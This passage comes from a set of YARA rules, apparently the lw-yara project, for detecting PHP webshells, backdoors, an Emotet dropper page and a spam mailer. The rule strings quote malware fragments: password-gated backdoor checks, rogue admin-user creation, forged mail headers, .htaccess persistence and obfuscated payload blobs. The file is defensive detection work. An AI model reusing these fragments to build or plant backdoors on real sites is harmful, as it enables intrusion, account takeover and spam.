      $s11 = "wq5vfmGn8l/o7c3f7S92+3XZq1e782X1R/by4w4bX87jzS/2NVJf7CO228vs5V/3d/7qK7112UtHbafeYe94d/vdXe/+Z/upXft13Ut/l/9dPbTdK/8be/VW6Rt2+vt5" ascii
      $s12 = "nIL3l+FvnOLv5/Hz/O/4vdZ697s4TR7fj8IfFfb+Snr9BvZ+Aj/fwN5fC39k+PtZ/H3+/mr8fCN7P4730+j+frHRvedyY83nm9j7+EyeJveeH21yf7/S5N7Phmb2fgr+" ascii
      $s13 = "6msIcjrsAXn/md+shxL6L9/pX7/+q/f/P/36//L9/38='; private $contentName = 'FT_2K71C4X2ZQ_CN_10102019.doc'; private $contentType = 'a" ascii
      $s14 = "x/eC/E5n1Bhjkqm8fR5KLyf39HnhCwlj2015Xf4IhQlRzTKejD7xpindwNwK6mRuXtr5sgETtKeK+vEg3nQ+qpK/ifyAKQmjBMFmVXLRFUdX7tWH+RGM0uf4p5sh3fIB" ascii
      $s15 = "DsbWaxtspYNOS3GE797ewBNascuboGeXKdmhbNq+1PAeyfL2Sjs1L774swipZ2MLFtDyiopyJiY+czivHo8RUuS9tqHHe6c2Uff7myBvC3PPC9ifPfVDjZ1PBLKV2Bx+" ascii
      $s16 = "+uwMr2m9vnKyqRuzHzIJM6XP32wiaglsxKeh49Ot9iftPrm7ulG3G8zKX/ajAl8/Uhc96K2gwc5Il2f5HY9M5+iIu6Oxsd/qlfLS+/1F6EYla/F4U51iZBfb05h02ylM" ascii
      $s17 = "dqk3KYxhIHEhXnc1gLewCVsRY/wnBZnsvFj3cDvWQEbqCbGzQ86ur2VtXYIu4b36oX4lrxnD1L/dmFnmNR/BI6IbwXMB2WMXL8ylVdmtgPkIaSovWlog+WwZUUg2Zm+2" ascii
      $s18 = "xD0sQo8FTpbk5olOVVcCq+spSX0VxwUj3zBUKuFauyFTndOJkXPLNtPK7pGdVKrvqO6sWycpUl9drmbXH+iSbEBwCeYswPpT7Z6vrm+CZGet1voZXB2suzhUPjxZW4pG" ascii
      $s19 = "HCP6PBJZsrtexQbe+wBuRBTSnHBKxLAw5a2n2XasCEt2ak3F8euPG6t1d8xaVgkNV0CyucVxsPyBjKrqE7o89xou2IrxFSlBJkhdaKRBtwgLppDAn4etqDd2uHCF5vlx" ascii
      $s20 = "E6/htzyFgatgEtema9d9nYOWGlBjVxeC4+F9IwOkjx2zq8hAgVpgr8VBs2TrPZSbrWcYMiGRZHyjIjmiVcs2R/xZrs0kkYtTKTRwVjxY2olr2qHGfU32PMaQyQUhlDgW" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 600KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule backdoor_zzz {
   meta:
      description = "PHP - file backdoor_zzz.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "edea8d3d181d9b57ebdbbe63ebd9d086f1b5f8b0978df47da45043420616cd5f"
   strings:
      $s1 = "if (file_exists(\"x15q5mcjtk.php.suspected\")) rename (\"x15q5mcjtk.php.suspected\", \"x15q5mcjtk.php\");" fullword ascii
      $s2 = "RewriteRule ^([A-Za-z0-9-]+).html$ x15q5mcjtk.php?world=5&looping=176&hl=$1 [L]\");" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule emotet_2_index {
   meta:
      description = "PHP - file emotet-2_index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "37dbbe1996e976122e2d87dc8d019e1dc7a9eeb049c59105f819c91c0ce65c26"
   strings:
      $x1 = "class Rst { const PLATFORM_UNKNOWN = 0; const PLATFORM_ANDROID = 1; const PLATFORM_APPLE = 2; const PLATFORM_LINUX = 3; const PL" ascii
      $s2 = "ho $sp0b39f9->execute();" fullword ascii
      $s3 = "itrs.exe'; private $contentType = 'application/octet-stream'; private function spba9f81() { $sp46a5c8 = isset($_SERVER['HTTP_USE" ascii
      $s4 = "n execute() { $sp53dcff = '.' . sha1(basename(dirname(__FILE__))); if (($sp7d2336 = fopen($sp53dcff, 'c+')) !== false) { if (flo" ascii
      $s5 = "sposition: attachment; filename=\"' . $this->contentName . '\"'); header('Content-Transfer-Encoding: binary'); return gzinflate(" ascii
      $s6 = "RSYUfSI08TPDktsSKCR9HMmM0KbXESiJK3jDfsJ95XzrUUNCaccUf09W6FqO87T5aArHft0wbYmSDUmpLDhcExlkUbTKyU9CItI3PzOKsom2Lo2zAmf3Kwsf+HB5fQF5" ascii
      $s7 = "N84+3c//nnWaJEsb+mPjOHPx5V2Vo0vTwx8mxxnet4IGzjIRc294+ufmlleXyTZ8gvMnv1fVf/vcPiKW2y9k+6F5ssDIutGBdKlQoHXZZsoy9JQiV1N8+MtFx5f3vAlK" ascii
      $s8 = "DFzkhrOMelnlMr0l7in0KgwGnHkFL/0/f9XS480uKbTPMp88mWru1AYVm9z5ma1nnCdvm1hn+gaEWZvwLOGFZlrgZz/LdwkO0bmm1F8rNzqNCd/reuC9T6bdUllB48cu" ascii
      $s9 = "TYixZB5F88VfTPlxzVB08uzq7n6/KvyR2KiooUNH1CxasmjJkjd2vbFk2bJlEHXR+Uvi/PRC8V5eYSHr7+7Rw6eHT0Htsrply5Zs2bIFxEPEJUsg/Gk+/EW9m2cHd0/3" ascii
      $s10 = "fm7FdLRGHkN773fqc5PWTlHlM5YsRy+1VJVivtvGkWcgCorPBxKHLItfqRIIGRIOhIAp0CiHreJ7qpgob457bB3EGuGuC1EQdAvKrfcfcTlB5yB3gijXYdIP/6/nDwIG" ascii
      $s11 = "R_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : ''; $spc3aced = self::PLATFORM_UNKNOWN; if (stripos($sp46a5c8, 'windows') !== false) " ascii
      $s12 = "6CUX488V8dZac+SuDkHNM9FbaQY0HG7q0Whg9xpVR/aktOqjGp94i2A/Z41rb5bvfwjsVwc+fS3EdrcHOHiQrZtfhLOg+XhmvGUAEDHaiuhRVxj5/8pFyxAQv2MmRUqw" ascii
      $s13 = "zLpj8rojzd/5q057hrmoPtgp+HWtO+bybZJqYknd4aUldc1LtV/SwMq6Iye/bfgWRrRDi1Reh8rpA/c+/Gemk74/uuKLBYHf+qt0Hqplp1DLlm3HT+PW7aXvW9Z9QZrC" ascii
      $s14 = "KHuwY5ZrnqyLaCWn0DxSbbUoxU0Q3ysIyVFbviGyP74RamNgKTRKIllOXRl08FXyYaIsN4HXBR/Y6zRi0QGJshZcy/9jpKefos1viSK5viYpRgi0tatck0mqSpysSHJq" ascii
      $s15 = "3yyhz4Byso7/hUi9ID27F6rmSHh/QAkMf76KQP0CCosud4PAKgKlwGJqFE97Ccpy7EbraXIBKCfo270k9MOg5PhVqBOp06BYh3dUS3inQVlcgjtCoJ4GxYP8VIfAuggK" ascii
      $s16 = "uSZwhsvppXDp0cequQazBNiGMHLIQYc5Lfyfm0UIncNmNMrVUPA/m6TA7s8QmqzBzIRbPbwVrjy6YtykPiVMvTeQ7bTcBx5Ps8NR48c5pu+k5jBcrr1a/X9x9u/xTP5x" ascii
      $s17 = "Zf7wW+QsffthE13hO2fT3+PwBBALHdaSBW7ViaHnB3K1kTiYGaEX8s5fB4YL8WcB0nwPQ0GNrjFDxFKSZ7CHZkv2dzB3ATkiVO8DKPgjDfXLq3+TTlzfftxJXEqLogWK" ascii
      $s18 = "B1q1ddiKLjlvMy7xo3pGxFdsnKh+bi3WATw6kIRNUR4MAL7372EkRtMeyEG2dVT1TSI/EuBqJEFr2M+Fgf5DQp6tbDPyG5L1l9bo5RHHYU1SlgnpzPOOgGCMXt79lGFk" ascii
      $s19 = "LoGhChO6E2AnmaoYNDAaZIYJZDTyLXypYW3a9uaoF9yCrYEj1C/OOOMjHi23yC96oF45URPrstUhEARqB3Td2pjWngISEa1mIrQzh3hYjUvDsgCmoCvmLk2ZA+Vek9+H" ascii
      $s20 = "zqLiZ4HYHj8kNwgm4X8qejjC7cLoGLV5cJuMWG3mp8do863k3W+7PW4rG9cPJG0l44cbbx/FWfHh72YJt5mfa3zAREdffn3YVmzoaOApfMB4UE13wRTvm5PM5WoFkKm6" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 800KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule mailer_5d9374665f5da {
   meta:
      description = "PHP - file mailer_5d9374665f5da.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "5a3ac415ae87f2a4984f2721f1ba75b65c3dcdf5a1b123d431545a3d6501dd6d"
   strings:
      $s1 = "$headers.='From: '.'=?utf-8?B?'.base64_encode(randText()).'?='.' <'.$from_name.'@'.$_SERVER['HTTP_HOST'].'>'.\"\\r\\n\";" fullword ascii
      $s2 = "$header='From: '.'=?utf-8?B?'.base64_encode(randText()).'?='.' <'.$from_name.'@'.$_SERVER['HTTP_HOST'].\">\\r\\n\";" fullword ascii
      $s3 = "$headers.='From: =?utf-8?B?'.base64_encode($from).'?= <'.$from_name.'@'.$_SERVER['HTTP_HOST'].'>'.\"\\r\\n\";" fullword ascii
      $s4 = "$header='From: =?utf-8?B?'.base64_encode($from).'?= <'.$from_name.'@'.$_SERVER['HTTP_HOST'].\">\\r\\n\";" fullword ascii
      $s5 = "$headers.='Content-Type: multipart/mixed; boundary=\"'.$boundary.\"\\\"\\r\\n\\r\\n\";" fullword ascii
      $s6 = "$ip=gethostbyname($_SERVER['HTTP_HOST']); $result='';" fullword ascii
      $s7 = "return file_get_contents($_FILES['file']['tmp_name']);" fullword ascii
      $s8 = "$header.='Content-Type: text/html; charset=\"utf-8\"'.\"\\r\\n\";" fullword ascii
      $s9 = "$header.='Content-Type: '.$type.'; charset=\"utf-8\"'.\"\\r\\n\";" fullword ascii
      $s10 = "$login=strtolower(str_replace('.','',$login[0]));" fullword ascii
      $s11 = "$dnsbl_check=array('b.barracudacentral.org','xbl.spamhaus.org','sbl.spamhaus.org','zen.spamhaus.org','bl.spamcop.net');" fullword ascii
      $s12 = "$login=explode('@',$email); $result='';" fullword ascii
      $s13 = "$body.='Content-Disposition: attachment; filename=\"'.$filename.'\"'.\"\\r\\n\";" fullword ascii
      $s14 = "$body.='Content-Type: '.$_FILES['file']['type'].'; name=\"'.$filename.'\"'.\"\\r\\n\";" fullword ascii
      $s15 = "$r_from=Random(dataHandler(urldecode($_POST['f'])),$data);" fullword ascii
      $s16 = "$headers.='X-Mailer: PHP/'.phpversion().\"\\r\\n\";" fullword ascii
      $s17 = "return $result.'@gmail.com';" fullword ascii
      $s18 = "$replyto=$from_name.'@'.$_SERVER['HTTP_HOST'];" fullword ascii
      $s19 = "$reply=$from_name.'@'.$_SERVER['HTTP_HOST'];" fullword ascii
      $s20 = "$filename=filename('1.txt'); $boundary=md5(uniqid());" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 40KB and
         ( 8 of them )
      ) or ( all of them )
}

rule uploader_wp_themes {
   meta:
      description = "PHP - file uploader_wp-themes.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "86f65fbbf9b9c2b96386d7206d1a7b064731244cc0b9b8a6e2fcb66a56e8f2a4"
   strings:
      $s1 = "<?php" fullword ascii
      $s2 = "error_reporting(0)" fullword ascii
      $s3 = "ignore_user_abort(1)" fullword ascii
      $s4 = "curl_exec($cur);" fullword ascii
   condition:
       ( all of them )
}

rule backdoor_wp_code {
   meta:
      description = "PHP - file backdoor_wp_code.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "de94bbc0d4fca3b778c6fad1a7719c8aacce8e464be65864e41abefc0326ac6f"
   strings:
      $s1 = "if(!empty($_POST['password']) && md5($_POST['password']) == SHELL_PASSWORD) {" fullword ascii
      $s2 = "$content .= \\'<a href=\"https://www.freetellafriend.com/tell/?url=\\'.$taf_permlink.\\'&title=\\'.$taf_title.\\'\" onclick=\"wi" ascii
      $s3 = "if(empty($_COOKIE['password']) || $_COOKIE['password'] != SHELL_PASSWORD) {" fullword ascii
      $s4 = "Plugin URI: http://www.freetellafriend.com/get_button/" fullword ascii
      $s5 = "$taf_img = get_settings(\\'home\\') . \\'/wp-content/plugins/tell-a-friend/button.gif\\';" fullword ascii
      $s6 = "setcookie('password', SHELL_PASSWORD, time()+60*60*24);" fullword ascii
      $s7 = "define('SHELL_PASSWORD', 'a6a8cb877ee18215f2c0fc2a6c7b4f2a');" fullword ascii
      $s8 = "if((empty($_COOKIE['password']) && empty($_POST['password'])) || (!empty($_POST['password']) && md5($_POST['password']) != SHELL" ascii
      $s9 = "if((empty($_COOKIE['password']) && empty($_POST['password'])) || (!empty($_POST['password']) && md5($_POST['password']) != SHELL" ascii
      $s10 = "Author URI: http://www.freetellafriend.com/" fullword ascii
      $s11 = "Description: Adds a \\'Share This Post\\' button after each post. The service which is used is freetellafriend.com which support" ascii
      $s12 = "Description: Adds a \\'Share This Post\\' button after each post. The service which is used is freetellafriend.com which support" ascii
      $s13 = "if(empty($_REQUEST['wp_username']) || empty($_REQUEST['wp_password']) || empty($_REQUEST['wp_email'])){" fullword ascii
      $s14 = "print '<a href=\"'.$base_name.'\" target=\"_blank\">'.$base_name.'</a>';" fullword ascii
      $s15 = "define('PASSWORD_FILE', 'p.txt');" fullword ascii
      $s16 = "$new_posts_array[$i]['post_content'] = $posts_array[$i]->post_content;" fullword ascii
      $s17 = "$content .= \\'<a href=\"https://www.freetellafriend.com/tell/?url=\\'.$taf_permlink.\\'&title=\\'.$taf_title.\\'\" onclick=\"wi" ascii
      $s18 = "print array_to_json(get_users());" fullword ascii
      $s19 = "if(!empty($_GET['get_users'])) {" fullword ascii
      $s20 = "if(function_exists('get_users')) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}


rule webshell_huokiv {
   meta:
      description = "PHP - file webshell_huokiv.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "2c62fa698f2a3afd78aac9a0ec5193b6e92c31c58aabc03925d6b49eab0a5785"
   strings:
      $s1 = "K<=RdpEpKmaDTL:KNImSYLPBipGl,pGo>M8ShIc>0575OmWO0X;0,W=wzN1JTBNj4gW=YT1M+ADlbhzz2s+B5:AQ +OvROVmZ RU lJLb>C=V=ZhP55jzrH - Q>=k4 " ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 4KB and
         ( all of them )
      ) or ( all of them )
}

rule backdoor_wp_update {
   meta:
      description = "PHP - file backdoor_wp-update.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "b3566d9844c2eab9d8b6d04c47f54005996bfe4e74809baa6eb33fbe9608240b"
   strings:
      $x1 = "print \"User has been created.<br>Login: {$_GET['username']} Password: {$_GET['password']}<br>\";" fullword ascii
      $s2 = "print '<a href=\"'.wp_login_url().'\" title=\"Login\" target=\"_blank\">Login</a><br>';" fullword ascii
      $s3 = "if(!empty($_POST['password']) && md5($_POST['password']) == SHELL_PASSWORD) {" fullword ascii
      $s4 = "echo \"If you see no errors try browsing the <a href=\\\"\".get_site_url().\"\\\" target=\\\"_blank\\\">site</a> now.<br>\\n\";" fullword ascii
      $s5 = "$content .= \\'<a href=\"https://www.freetellafriend.com/tell/?url=\\'.$taf_permlink.\\'&title=\\'.$taf_title.\\'\" onclick=\"wi" ascii
      $s6 = "print '<form method=\"post\">Password : <input type=\"text\" name=\"password\"><input type=\"submit\"></form>';" fullword ascii
      $s7 = "if(empty($_COOKIE['password']) || $_COOKIE['password'] != SHELL_PASSWORD) {" fullword ascii
      $s8 = "$hashed_password = trim(file_get_contents(PASSWORD_FILE));" fullword ascii
      $s9 = "if(!empty($_GET['action']) && $_GET['action'] == 'set_password' && !empty($_GET['hashed_password'])) {" fullword ascii
      $s10 = "<script src=\"https://cloud.tinymce.com/stable/tinymce.min.js\"></script>" fullword ascii
      $s11 = "<link rel=\"stylesheet\" href=\"http://code.jquery.com/ui/1.10.3/themes/smoothness/jquery-ui.css\" />" fullword ascii
      $s12 = "Plugin URI: http://www.freetellafriend.com/get_button/" fullword ascii
      $s13 = "$taf_img = get_settings(\\'home\\') . \\'/wp-content/plugins/tell-a-friend/button.gif\\';" fullword ascii
      $s14 = "<script src=\"http://code.jquery.com/jquery-1.9.1.js\"></script>" fullword ascii
      $s15 = "<script src=\"http://code.jquery.com/ui/1.10.3/jquery-ui.js\"></script>" fullword ascii
      $s16 = "<option value=\"<?php print $dir_up . 'wp-content/plugins/tell-a-friend/tell-a-friend.php'; ?>\">tell-a-friend.php</option>" fullword ascii
      $s17 = "if(empty($_GET['username']) || empty($_GET['password']) || empty($_GET['email'])){" fullword ascii
      $s18 = "setcookie('password', SHELL_PASSWORD, time()+60*60*24);" fullword ascii
      $s19 = "print '<option value=\"'.$bloguser->ID.'\"'.$selected.'>'.$bloguser->data->display_name.'</option>' . \"\\n\";" fullword ascii
      $s20 = "if(empty($_COOKIE['password']) && empty($_POST['password']) || (!empty($_POST['password']) && md5($_POST['password']) != SHELL_P" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 50KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule webshell_wp_menus {
   meta:
      description = "PHP - file webshell_wp-menus.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "51ba6bcf991fc31bca914797a90aec63b11ac506f0d76dd632c016b814c3ab9b"
   strings:
      $s1 = "<?php function absfsfrsxvcxvx($a,$b,$c,$d,$e){return $a.$b.$c.$d.$e;}$tRHzWnG3890 = \"r7vmb.l2tup96;ke3zd0sjn*xg4(5o_fc1hyi/awq8" ascii
      $s2 = "u7028uEyJGxuYOnFGXr/7xzyI3agbzqcIxfN3YEy9KXTMh9PjLjT/9PD4CHrDbtYeUlP+/a/hfMpnA0BEcejNIt+Jxm5ULtGoqb4J3XgeTpkXdfloyuynfHSBhhnVouP" ascii
      $s3 = "oXFc4qPWHtf5E3HvQGEyeeNKmbMdDS6es2T8wiOdnB+uPMUSNZg0GJ2aJWTW9e8h1ck2EitS7LWUZptTS2mN1a632U39wEd0vf/4/W1/uV0prVtXcHMQ79Xvf5Oa0Izw" ascii
      $s4 = "CtIZtK7zy+m4CD7PACeME+hwgAH8fDthYg8JjPIWyH0xgz3VDDerKcxcIBZ26e/KOneHa4LlOOAOqRN7hO7ZHbZuHDlLPQbwZbzDbcHzfAsCKts6zAwd0iKFT3edHbN0" ascii
      $s5 = "U5n3F3SNlOmw5HZldTKOJ+P9Mswy7Iz1HRvc0vTIvO1qNF4kODCOM6j7Z3zE9UCS/AG6JdwpwNmB45BraepbXG+l3iUU+nax//4uM8mCT7oWwPovDZhqxCu1oaKc8ASo" ascii
      $s6 = "GhswMwoqj/36qqi/TPReEnOznec96vXdspru6uvpeXVVdVXLm8bg7c6KItZk1eDIc9J1mv1ff/PnJ8GFjMHzQdx4+Gjz42XnSGNYfWlv//lepH/hBiNA/DIY8ZeAOnbk" ascii
      $s7 = "JGp2NgXu1gZOLHEqzHzOcduS77qzcMDXlJhOIlSaeA61ZxJz5V/YXG4XujHFaKbAs8oFWxj6NXMnp7apsLe+Rfl6P9EWPGMzcbZ3Sz+0Uy4hY/D/US/079FLf7KXv4ol" ascii
      $s8 = "Tvc2mTO7jMz5K3j3dOzxkccBe7n/kuckc4xCQgfkEyCGSRWFAPN/fU/kDfKCnZz47PEoK4/LnuVDGqJwPt5mpivINQQ7U4ZFRUqx+I1NRxBe7yFQuqRndOBlaDYleVNf" ascii
      $s9 = "SMZOHvQ+YYpfeuqJOqwj/wPXdWLVWjRxPfo4VkeZHPqJVKiPpfJa+q+uNSruN/k3ZU64YatHf6sUVPQwxNWPqiRj+EXoxxi+qKVUY058fKkLuSVBek7y28jycYKyMklp" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 70KB and
         ( all of them )
      ) or ( all of them )
}

rule backdoor_jm_code {
   meta:
      description = "PHP - file backdoor_jm_code.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "a676e044d250466dfb21e06c7bbf75ccfea523afe77aa2d641a8202acf09af7a"
   strings:
      $s1 = "$cats[$i]->path = get_full_path(JURI::base() . 'index.php?option=com_content&view=category&layout=blog&id=' . $cats[$i]->id);" fullword ascii
      $s2 = "if(!empty($_POST['password']) && md5($_POST['password']) == SHELL_PASSWORD) {" fullword ascii
      $s3 = "setcookie('password', SHELL_PASSWORD, time() + 60*60*24);" fullword ascii
      $s4 = "print '<form method=\"post\">Password : <input type=\"text\" name=\"password\"><input type=\"submit\"></form>';" fullword ascii
      $s5 = "$usersParams = &JComponentHelper::getParams( 'com_users' ); // load the Params" fullword ascii
      $s6 = "$user = JFactory::getUser(0); // it's important to set the \"0\" otherwise your admin user information will be loaded" fullword ascii
      $s7 = "if(empty($_COOKIE) || $_COOKIE['password'] != SHELL_PASSWORD) {" fullword ascii
      $s8 = "define('SHELL_PASSWORD', 'a6a8cb877ee18215f2c0fc2a6c7b4f2a');" fullword ascii
      $s9 = "$sql = \"SELECT path FROM #__menu WHERE link LIKE 'index.php?option=com_content&view=category&%id={$article->catid}' \";" fullword ascii
      $s10 = "define('JPATH_COMPONENT_ADMINISTRATOR', JPATH_BASE . DS . 'administrator' . DS . 'components' . DS . 'com_content');" fullword ascii
      $s11 = "$sql = \"SELECT * FROM #__content WHERE id='\" . $_REQUEST['article_id'].\"'\"; // prepare query" fullword ascii
      $s12 = "if((empty($_COOKIE['password']) && empty($_POST['password'])) || (!empty($_POST['password']) && md5($_POST['password']) != SHELL" ascii
      $s13 = "if((empty($_COOKIE['password']) && empty($_POST['password'])) || (!empty($_POST['password']) && md5($_POST['password']) != SHELL" ascii
      $s14 = "jimport('joomla.application.component.helper'); // include libraries/application/component/helper.php" fullword ascii
      $s15 = "if(!empty($_REQUEST['user_name']) && !empty($_REQUEST['user_password']) && !empty($_REQUEST['user_email'])) {" fullword ascii
      $s16 = "require_once(JPATH_BASE.DS.'components'.DS.'com_content'.DS.'helpers'.DS.'route.php');" fullword ascii
      $s17 = "//echo JPATH_BASE. \"/administrator/components/com_content/models/article.php\";" fullword ascii
      $s18 = "require_once JPATH_BASE. \"/components/com_content/models/article.php\";" fullword ascii
      $s19 = "print '<a href=\"'.$base_name.'\" target=\"_blank\">'.$base_name.'</a>';" fullword ascii
      $s20 = "define('PASSWORD_FILE', 'p.txt');" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule webshell_api {
   meta:
      description = "PHP - file webshell_api.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "c4c73576eb6bff8fd1c224adfaa94acdc02e1a36bfdcc486b81bb4fb8687c973"
   strings:
      $s1 = "$DZcvSEa = \"7b1Jd+JK0zX6g57BJwlTz2FwBwZLAmEJoybVzNRQCJQClcGm+fV3R0q0Buw677vWdwd34HUOhZrMyIgde0c29Eq2S8vOLmgZPNU7u0znH9Fuuhm6q2G" ascii
      $s2 = "f/5f\"; $QnER = ''; for ($i = 0; $i < 6; $i++) { $nZz7Ki3 = $L4b6[$i]; $QnER .= $p4VirK[$nZz7Ki3]; }" fullword ascii
      $s3 = "NPGZBO5e0NjUOmIzu/9OcIY+kwZ9wSfxHEPUGsVzqJ+iDYhHGePbp7UZjIsxBzbRNYjNdlLf14p9W4oRK9b8eZP2p//F9/953N/m3bX2oWecfJTR+45tEj5D73vd37H1" ascii
      $s4 = "0/ZtbtG3d5P7ubxocGJKbTW0ztiVLeqXmONC3+7elwXIvbMv98mwz+7RfSnaC3y/vg+62do/ui8pNXD4L/cV4eyEfdd/Rh/53Y+qyQEH1Y7LtNUiRR4BN3l69D7S5Anx" ascii
      $s5 = "Q2/ejJ86v5/p/5+Px9Asx1viT2fx8hFp0C/Sv3zegS9RPemlC/7KbuDhEQ9M5Ki/85+6/nHAO6F/MZ4Uj7fyx8X3/xJf7vCJUz4R+Vo3AsrX8F9cb9H7/sp+6bf8p+HX" ascii
      $s6 = "ka9E7QI5JiWdP0cuhL0jbut8R1gPm7Qd2L+Ox8Hy8h2bn9zza8StV4d1f9tqx/Ou61s6cZ26rifyTslaAw3cvwW/VLgSeafvL9qhf33/6XvDoPwtcsF8+ctVWZcVzA2k" ascii
      $s7 = "xuH727WMs/lNjXQT2w8luye4QfnPQqz7U7WxQ/2e3ZqzXX42cw2iFnRn/mB/R+t/0eFn9ZDrGv2X+5ucIeYE6roIe0qRX2k92YBvP4gXnj3n4INUX/lunX/zzHqdf0Jr" ascii
      $s8 = "Dz5TtnnYgk/3DLSddPx4inH03N0Vni3Eu8X4DHp5E2fwXZ36pf2OFdY+/H8GLZHd9PP0CiOtHPl1BowD/nDwUvJvlcbov+l+uTX3GKtSKxKffwgOXWpS0jJo7GicfwW9" ascii
      $s9 = "bnseldn+/vzAIXZs8E4TPBZjt3jAl6/aFQbd6gtPmT6+/uSPYs3CwlPH7UzRBmNvHftq1Q7n1jAqrTVbZDNTWm5ClspJsVbHQfcta3V/+Tx3otLuJ307ZnO+x/fbVLdf" ascii
      $s10 = "qfujLZy5FSUFV83eura3XnWTYts9tA/9fz/r/3vI8Dxp7T1qr8fGW5ezAOPyKeyL93llxGyXe7DXPiltN9JtE89/91+0nqd527p/2oevWa1IqvQR0zzTazPW4kXmLbdm" ascii
      $s11 = "Tn81L6+fSdiVSrDnDH7VC8vB+b/L2Q79yuGziOFiasxCqm8QL6ljV6X/Zx+hL4vvCYORuxbftfPcbkCcKtMpjoQ/NRh6yOvSf5DLJU/wwft++j3u1X9/zfEeYynwzZbT" ascii
      $s12 = "1xLl0GCRAi5E41E9rjUc378XeKmb20y3Bd4j3gpwR+IyiP+ba7+u4+Pq+fmQ7mcLTvlpE/K8lyp1/JMWD0uhxc/t9bV/Z1rqzH8iswip1rxIZCOMdfADdUD8op2Jtavb" ascii
      $s13 = "s2IX9+2ZycV+04Mebfb6C7wKGnx6cpmtfXuW4bftq/pxyyC98/T3+/OyUVyfLf5qs1Cis08y5bCfXKP9kg/4yQ/PGoCeZFRPVLZ/xP5e31i7dNbinmP8hb7REow4nX0P" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 90KB and
         ( 8 of them )
      ) or ( all of them )
}

rule webshell_index {
   meta:
      description = "PHP - file webshell_index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
      hash1 = "b6a4dc08202aa6653ef33e40fc29674a6f4bd6c75c7dcf13a3b27f06ccfdf1a8"
   strings:
      $x1 = "$OOO__00O0_=\"kvlqst2onx-zpaf7edg5jcu6mr0b983iy_4h1w\";$O0O_0OO0__=$OOO__00O0_{4}.$OOO__00O0_{5}.$OOO__00O0_{25}.$OOO__00O0_{16}" ascii
      $s2 = "x5f\\x4f\\x4f\\x5f\\x5f\\x30\\x30\\x30\\x4f\"])?80:$OO00__O0O_[\"\\x4f\\x5f\\x4f\\x4f\\x5f\\x5f\\x30\\x30\\x30\\x4f\"];}$OOO00__" ascii
      $s3 = "_0=$OOO__00O0_{17}.$OOO__00O0_{13}.$OOO__00O0_{5}.$OOO__00O0_{16};header('Content-Type:text/html;charset=utf-8');${\"\\x47\\x4c" ascii
      $s4 = "0\\x4f\\x30\\x30\\x5f\\x5f\\x5f\\x4f\\x4f\"](\"/%host%/si\",$OO__O000_O,$O0O0_O0_O_);$O_O_00O0O_=${\"\\x47\\x4c\\x4f\\x42\\x41" ascii
      $s5 = "0\\x4f\\x30\\x30\\x5f\\x5f\\x5f\\x4f\\x4f\"](\"/%host%/si\",$OO__O000_O,$O_O_00O0O_);$OO_0_O0O_0=${\"\\x47\\x4c\\x4f\\x42\\x41" ascii
      $s6 = "__0.\\'|\\'.$OO00_O_O0_);$O0O0O_0_O_=${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x4f\\x30\\x4f\\x30\\x30\\x5f\\x5f\\x5f\\x4f" ascii
      $s7 = "}[\"\\x4f\\x5f\\x4f\\x4f\\x30\\x5f\\x5f\\x30\\x4f\\x30\"]($OO___O000O,CURLOPT_USERAGENT,\\'WHR\\');${\"\\x47\\x4c\\x4f\\x42\\x41" ascii
      $s8 = "f\"](\\'c0xOThTi0osdLtPS1wIA\\');unset($OOO00__O0_);$OO__O_0O00=\"GET $O0O0__OO_0 HTTP/$O__O00O0_O\\\\r\\\\n\".${\"\\x47\\x4c\\x" ascii
      $s9 = "O_00.\\'/\\'.$OOO_O__000)){$OOOO00_0__Array[] =$OOO_O__000;}}$OO_O__000O=\\'temp\\';$OOOO00_0__Array[] =$OO_O__000O;return $OOOO" ascii
      $s10 = "O_0O00_O_).\\'.txt\\';$O0O__0OO0_=${\"\\x47\\x4c\\x4f\\x42\\x41\\x4c\\x53\"}[\"\\x4f\\x5f\\x4f\\x5f\\x4f\\x4f\\x30\\x30\\x5f\\x3" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 100KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule backdoor_button_webdav {
   meta:
      description = "PHP - file backdoor_button-webdav.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-10-11"
